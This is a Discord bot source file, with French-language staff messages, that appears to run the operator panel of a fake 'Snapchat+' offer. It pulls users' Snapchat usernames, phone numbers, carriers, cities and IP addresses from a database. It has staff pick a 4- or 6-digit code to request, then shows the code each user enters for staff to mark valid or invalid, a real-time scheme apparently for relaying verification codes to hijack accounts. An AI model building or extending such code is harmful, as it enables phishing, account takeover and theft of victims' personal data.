import 'dotenv/config';
import { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, SlashCommandBuilder, REST, Routes } from 'discord.js';
import { neon } from '@neondatabase/serverless';

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const GUILD_ID = process.env.DISCORD_GUILD_ID;
const LOG_CHANNEL_ID = process.env.DISCORD_LOG_CHANNEL_ID;
const DATABASE_URL = process.env.DATABASE_URL;
const STAFF_SECRET = process.env.STAFF_SECRET;
const API_BASE = process.env.API_BASE || 'https://snaptech.vercel.app';

if (!TOKEN || !CLIENT_ID || !DATABASE_URL) {
    console.error('❌ Missing variables: DISCORD_BOT_TOKEN, DISCORD_CLIENT_ID, DATABASE_URL');
    process.exit(1);
}

const sql = neon(DATABASE_URL);
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// ─── COULEURS OPÉRATEURS ───
const OPERATOR_COLORS = {
    'sfr': 0xe2001a,        // Rouge SFR
    'orange': 0xff6600,     // Orange
    'bouygues': 0x0099cc,   // Bleu Bouygues
    'base': 0x00a4e0,       // Bleu BASE
    'orange_be': 0xff6600,  // Orange Belgium
    'proximus': 0x5c2d91,   // Violet Proximus
    'telenet': 0xe2001a     // Rouge Telenet
};

const DEFAULT_COLOR = 0xfffc00; // Jaune Snapchat

function getOperatorColor(operator) {
    return OPERATOR_COLORS[operator?.toLowerCase()] || DEFAULT_COLOR;
}

// ─── SLASH COMMANDS ───
const commands = [
    new SlashCommandBuilder().setName('config').setDescription('Set the log channel')
        .addChannelOption(opt => opt.setName('channel').setDescription('Discord channel').setRequired(true)),
    new SlashCommandBuilder().setName('panel').setDescription('Show the staff panel'),
    new SlashCommandBuilder().setName('claim').setDescription('Claim a request')
        .addStringOption(opt => opt.setName('phone').setDescription('Phone number').setRequired(true)),
    new SlashCommandBuilder().setName('setlength').setDescription('Set code length')
        .addStringOption(opt => opt.setName('phone').setDescription('Phone number').setRequired(true))
        .addIntegerOption(opt => opt.setName('length').setDescription('4 or 6').setRequired(true)),
    new SlashCommandBuilder().setName('wrongnumber').setDescription('Mark as wrong number')
        .addStringOption(opt => opt.setName('phone').setDescription('Phone number').setRequired(true)),
    new SlashCommandBuilder().setName('banip').setDescription('Ban an IP address')
        .addStringOption(opt => opt.setName('ip').setDescription('IP address').setRequired(true))
];

const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
    try {
        console.log('🔄 Deploying slash commands...');
        await rest.put(
            GUILD_ID ? Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID) : Routes.applicationCommands(CLIENT_ID),
            { body: commands.map(c => c.toJSON()) }
        );
        console.log('✅ Slash commands deployed');
    } catch (e) {
        console.error('Deploy error:', e);
    }
})();

// ─── READY ───
client.once('ready', () => {
    console.log(`🤖 Bot connected as ${client.user.tag}`);
    console.log(`📡 API: ${API_BASE}`);
    console.log(`📝 Log channel: ${LOG_CHANNEL_ID || 'Not set — use /config'}`);
    startPollingPending();
    startPollingCodeSubmitted();
});

// ─── POLLING 1: new PENDING requests ───
let lastPendingId = 0;

async function startPollingPending() {
    setInterval(async () => {
        try {
            const rows = await sql`
                SELECT id, username, phone, operator, country, city, ip_address, status, created_at
                FROM snap_requests
                WHERE id > ${lastPendingId} AND status = 'pending'
                ORDER BY id ASC
            `;
            for (const row of rows) {
                lastPendingId = Math.max(lastPendingId, row.id);
                await sendNewRequestEmbed(row);
            }
        } catch (e) {
            console.error('Pending polling error:', e.message || e);
        }
    }, 5000);
}

// ─── POLLING 2: CODE_SUBMITTED requests ───
let lastCodeSubmittedId = 0;

async function startPollingCodeSubmitted() {
    setInterval(async () => {
        try {
            const rows = await sql`
                SELECT id, username, phone, operator, country, city, ip_address, staff_code, code_length, status, created_at
                FROM snap_requests
                WHERE id > ${lastCodeSubmittedId} AND status = 'code_submitted' AND staff_code IS NOT NULL
                ORDER BY id ASC
            `;
            for (const row of rows) {
                lastCodeSubmittedId = Math.max(lastCodeSubmittedId, row.id);
                await sendCodeSubmittedEmbed(row);
            }
        } catch (e) {
            console.error('CodeSubmitted polling error:', e.message || e);
        }
    }, 5000);
}

// ─── Helpers ───
const carrierNames = {
    'orange': 'Orange', 'sfr': 'SFR', 'bouygues': 'Bouygues',
    'base': 'BASE', 'orange_be': 'Orange Belgium', 'proximus': 'Proximus', 'telenet': 'Telenet'
};

function formatPhone(phone) { return '``' + phone + '``'; }
function formatIP(ip) { return ip && ip !== 'unknown' ? '``' + ip + '``' : '`unknown`'; }

/**
 * Crée le bouton Ban IP si l'IP est valide
 */
function createBanIPButton(ip, phone) {
    if (!ip || ip === 'unknown' || ip === 'null' || !ip.includes('.')) return null;
    return new ButtonBuilder()
        .setCustomId('banip_' + ip)
        .setLabel('🚫 Ban IP')
        .setStyle(ButtonStyle.Danger);
}

// ─── Embed: NEW REQUEST ───
async function sendNewRequestEmbed(row) {
    const channel = client.channels.cache.get(LOG_CHANNEL_ID);
    if (!channel) { console.log('⚠️ Log channel not found'); return; }

    const color = getOperatorColor(row.operator);
    const carrier = carrierNames[row.operator] || row.operator;
    const ip = row.ip_address;

    const embed = new EmbedBuilder()
        .setTitle('📱 Nouvelle demande Snapchat+')
        .setColor(color)
        .setDescription('**Opérateur:** ' + carrier + '  |  **Pays:** ' + (row.country || 'Inconnu'))
        .addFields(
            { name: '👤 Username', value: '``' + row.username + '``', inline: true },
            { name: '📞 Téléphone', value: formatPhone(row.phone), inline: true },
            { name: '📡 Opérateur', value: '``' + carrier + '``', inline: true },
            { name: '🌍 Pays', value: '``' + (row.country || 'Inconnu') + '``', inline: true },
            { name: '🏙️ Ville', value: '``' + (row.city || 'Inconnue') + '``', inline: true },
            { name: '🌐 IP', value: formatIP(ip), inline: true },
            { name: '⏰ Date', value: '<t:' + Math.floor(new Date(row.created_at).getTime()/1000) + ':R>', inline: false }
        )
        .setFooter({ text: 'ID: ' + row.id + '  •  En attente de prise en charge' })
        .setTimestamp();

    const buttons = [
        new ButtonBuilder().setCustomId('claim_' + row.phone).setLabel('📋 Prendre en charge').setStyle(ButtonStyle.Primary)
    ];

    const banBtn = createBanIPButton(ip);
    if (banBtn) buttons.push(banBtn);

    const rowButtons = new ActionRowBuilder().addComponents(...buttons);
    await channel.send({ embeds: [embed], components: [rowButtons] });
    console.log('📨 New request: ' + row.phone + ' (' + carrier + ')');
}

// ─── Embed: CODE SUBMITTED ───
async function sendCodeSubmittedEmbed(row) {
    const channel = client.channels.cache.get(LOG_CHANNEL_ID);
    if (!channel) return;

    const color = getOperatorColor(row.operator);
    const carrier = carrierNames[row.operator] || row.operator;
    const code = row.staff_code || 'N/A';
    const len = row.code_length || 6;
    const ip = row.ip_address;

    const embed = new EmbedBuilder()
        .setTitle("🔓 Code soumis par l'utilisateur")
        .setColor(color)
        .setDescription("L'utilisateur a entré un code **" + len + " chiffres**. Veuillez vérifier ci-dessous.")
        .addFields(
            { name: '👤 Username', value: '``' + row.username + '``', inline: true },
            { name: '📞 Téléphone', value: formatPhone(row.phone), inline: true },
            { name: '🔢 Code entré', value: '```\n' + code + '\n```', inline: false },
            { name: '📡 Opérateur', value: '``' + carrier + '``', inline: true },
            { name: '🌍 Pays', value: '``' + (row.country || 'Inconnu') + '``', inline: true },
            { name: '🏙️ Ville', value: '``' + (row.city || 'Inconnue') + '``', inline: true },
            { name: '🌐 IP', value: formatIP(ip), inline: true }
        )
        .setFooter({ text: 'ID: ' + row.id + '  •  En attente de validation staff' })
        .setTimestamp();

    const buttons = [
        new ButtonBuilder().setCustomId('truecode_' + row.phone).setLabel('✅ Code correct').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('falsecode_' + row.phone).setLabel('❌ Code faux').setStyle(ButtonStyle.Danger)
    ];

    const banBtn = createBanIPButton(ip);
    if (banBtn) buttons.push(banBtn);

    const actionRow = new ActionRowBuilder().addComponents(...buttons);
    await channel.send({ embeds: [embed], components: [actionRow] });
    console.log('🔓 Code submitted: ' + row.phone + ' — Code: ' + code);
}

// ─── INTERACTIONS ───
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const parts = interaction.customId.split('_');
    const action = parts[0];
    const payload = parts.slice(1).join('_'); // reconstruct in case IP has dots

    // ─── CLAIM ───
    if (action === 'claim') {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'claim', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();

            if (data.success) {
                await interaction.editReply({ content: '✅ Demande **' + formatPhone(phone) + '** prise en charge par <@' + interaction.user.id + '>' });

                // Récupérer les infos pour la couleur
                const rows = await sql`SELECT operator, ip_address FROM snap_requests WHERE phone = ${phone} LIMIT 1`;
                const op = rows[0]?.operator;
                const ip = rows[0]?.ip_address;
                const color = getOperatorColor(op);

                const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(color)
                    .setTitle('📋 Demande en cours de traitement')
                    .setDescription('👤 Prise en charge par <@' + interaction.user.id + '>\n\n**Choisissez une action :**');

                const buttons = [
                    new ButtonBuilder().setCustomId('len4_' + phone).setLabel('🔢 4 chiffres').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('len6_' + phone).setLabel('🔢 6 chiffres').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('wrong_' + phone).setLabel('❌ Mauvais numéro').setStyle(ButtonStyle.Danger)
                ];

                const banBtn = createBanIPButton(ip);
                if (banBtn) buttons.push(banBtn);

                const actionRow = new ActionRowBuilder().addComponents(...buttons);
                await interaction.message.edit({ embeds: [newEmbed], components: [actionRow] });
            } else {
                await interaction.editReply({ content: '❌ ' + data.message });
            }
        } catch (e) {
            await interaction.editReply({ content: '❌ Erreur réseau' });
        }
    }

    // ─── 4 DIGITS ───
    if (action === 'len4') {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'set_length', phone, length: 4, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '✅ Code à 4 chiffres demandé pour ' + formatPhone(phone) : '❌ ' + data.message });
            if (data.success) {
                const rows = await sql`SELECT operator FROM snap_requests WHERE phone = ${phone} LIMIT 1`;
                const color = getOperatorColor(rows[0]?.operator);
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(color)
                    .setTitle('⏳ En attente du code (4 chiffres)')
                    .setDescription('👤 Prise en charge\n🔢 Code demandé : **4 chiffres**');
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    // ─── 6 DIGITS ───
    if (action === 'len6') {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'set_length', phone, length: 6, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '✅ Code à 6 chiffres demandé pour ' + formatPhone(phone) : '❌ ' + data.message });
            if (data.success) {
                const rows = await sql`SELECT operator FROM snap_requests WHERE phone = ${phone} LIMIT 1`;
                const color = getOperatorColor(rows[0]?.operator);
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(color)
                    .setTitle('⏳ En attente du code (6 chiffres)')
                    .setDescription('👤 Prise en charge\n🔢 Code demandé : **6 chiffres**');
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    // ─── WRONG NUMBER ───
    if (action === 'wrong') {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'wrong_number', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '✅ Mauvais numéro signalé pour ' + formatPhone(phone) : '❌ ' + data.message });
            if (data.success) {
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0xef4444)
                    .setTitle('❌ Mauvais numéro')
                    .setDescription("❌ L'utilisateur a été redirigé pour re-saisir son numéro.");
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    // ─── TRUE CODE ───
    if (action === 'truecode') {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'true_code', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '✅ Code validé pour ' + formatPhone(phone) : '❌ ' + data.message });
            if (data.success) {
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0x10b981)
                    .setTitle('✅ Code validé')
                    .setDescription('👤 Validé par <@' + interaction.user.id + '>\nL\'utilisateur est redirigé vers la page de félicitations.');
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    // ─── FALSE CODE ───
    if (action === 'falsecode') {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'false_code', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '❌ Code refusé pour ' + formatPhone(phone) + ". L'utilisateur doit re-saisir." : '❌ ' + data.message });
            if (data.success) {
                const rows = await sql`SELECT operator, ip_address FROM snap_requests WHERE phone = ${phone} LIMIT 1`;
                const op = rows[0]?.operator;
                const ip = rows[0]?.ip_address;
                const color = getOperatorColor(op);

                const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(color)
                    .setTitle('📋 Demande en cours de traitement')
                    .setDescription("👤 Prise en charge\n❌ Le code précédent était incorrect.\n\n**Choisissez une action :**");

                const buttons = [
                    new ButtonBuilder().setCustomId('len4_' + phone).setLabel('🔢 4 chiffres').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('len6_' + phone).setLabel('🔢 6 chiffres').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('wrong_' + phone).setLabel('❌ Mauvais numéro').setStyle(ButtonStyle.Danger)
                ];

                const banBtn = createBanIPButton(ip);
                if (banBtn) buttons.push(banBtn);

                const actionRow = new ActionRowBuilder().addComponents(...buttons);
                await interaction.message.edit({ embeds: [newEmbed], components: [actionRow] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    // ─── BAN IP ───
    if (action === 'banip') {
        await interaction.deferReply({ flags: 64 });
        const ip = payload;
        if (!ip || ip === 'unknown' || ip === 'null') {
            await interaction.editReply({ content: '❌ Impossible de bannir : IP invalide' });
            return;
        }
        try {
            const res = await fetch(API_BASE + '/api/ban-ip', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ip, secret: STAFF_SECRET, banned_by: interaction.user.tag })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '🚫 IP **' + ip + '** bannie avec succès !' : '❌ ' + data.message });
            if (data.success) {
                const bannedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0xef4444)
                    .setTitle('🔨 IP Bannie')
                    .setDescription('🚫 IP **' + ip + '** bannie par <@' + interaction.user.id + '>');
                await interaction.message.edit({ embeds: [bannedEmbed], components: [] });
            }
        } catch (e) {
            console.error('Ban IP error:', e);
            await interaction.editReply({ content: '❌ Erreur réseau lors du bannissement' });
        }
    }
});

// ─── SLASH COMMANDS ───
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'config') {
        const channel = interaction.options.getChannel('channel');
        process.env.DISCORD_LOG_CHANNEL_ID = channel.id;
        await interaction.reply({ content: '✅ Salon de logs défini sur <#' + channel.id + '>', flags: 64 });
    }

    if (interaction.commandName === 'panel') {
        const embed = new EmbedBuilder()
            .setTitle('🎛️ Panel Staff')
            .setDescription('Les demandes apparaissent automatiquement ici.\n\n**Couleurs des embeds :**')
            .addFields(
                { name: '🔴 Rouge', value: 'SFR / Telenet', inline: true },
                { name: '🟠 Orange', value: 'Orange / Orange Belgium', inline: true },
                { name: '🔵 Bleu', value: 'Bouygues / BASE', inline: true },
                { name: '🟣 Violet', value: 'Proximus', inline: true },
                { name: '🟡 Jaune', value: 'Autre opérateur', inline: true }
            )
            .setColor(0x000000);
        await interaction.reply({ embeds: [embed] });
    }

    if (interaction.commandName === 'claim') {
        const phone = interaction.options.getString('phone');
        await interaction.deferReply();
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'claim', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '✅ ' + data.message : '❌ ' + data.message });
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    if (interaction.commandName === 'setlength') {
        const phone = interaction.options.getString('phone');
        const length = interaction.options.getInteger('length');
        await interaction.deferReply();
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'set_length', phone, length, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '✅ ' + data.message : '❌ ' + data.message });
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    if (interaction.commandName === 'wrongnumber') {
        const phone = interaction.options.getString('phone');
        await interaction.deferReply();
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'wrong_number', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '✅ ' + data.message : '❌ ' + data.message });
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }

    if (interaction.commandName === 'banip') {
        const ip = interaction.options.getString('ip');
        await interaction.deferReply();
        try {
            const res = await fetch(API_BASE + '/api/ban-ip', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ip, secret: STAFF_SECRET, banned_by: interaction.user.tag })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '🚫 ' + data.message : '❌ ' + data.message });
        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
    }
});

client.login(TOKEN);
